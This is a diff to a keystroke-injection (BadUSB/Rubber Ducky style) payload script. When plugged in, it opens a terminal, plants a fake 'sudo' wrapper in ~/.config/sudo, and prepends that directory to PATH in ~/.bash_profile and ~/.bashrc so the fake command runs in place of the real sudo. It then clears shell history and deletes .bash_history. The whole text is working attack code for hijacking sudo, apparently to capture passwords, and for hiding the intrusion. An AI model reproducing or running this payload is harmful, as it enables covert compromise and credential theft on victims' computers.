@@ -16,13 +16,13 @@ DELAY 100
 STRING terminal
 ENTER
 DELAY 3000
+STRING rm -rf ~/.config/sudo
+ENTER
+DELAY 100
 STRING mkdir -p ~/.config/sudo
 ENTER
 DELAY 100
-STRING rm  ~/.config/sudo/sudo
-ENTER
-DELAY 100
-STRING echo '#!/bin/bash
+STRING echo '#!'$SHELL > ~/.config/sudo/sudo
 ENTER
 STRING /usr/bin/sudo -n true 2>/dev/null
 ENTER
@@ -62,16 +62,16 @@ STRING fi
 ENTER
 STRING fi' > ~/.config/sudo/sudo
 ENTER
-DELAY 200
+DELAY 100
 STRING chmod u+x ~/.config/sudo/sudo
 ENTER
-DELAY 200
+DELAY 100
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
 ENTER
-DELAY 200
+DELAY 100
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
 ENTER
-DELAY 200
+DELAY 100
 STRING history -c && rm .bash_history && exit
 ENTER
 DELAY 400
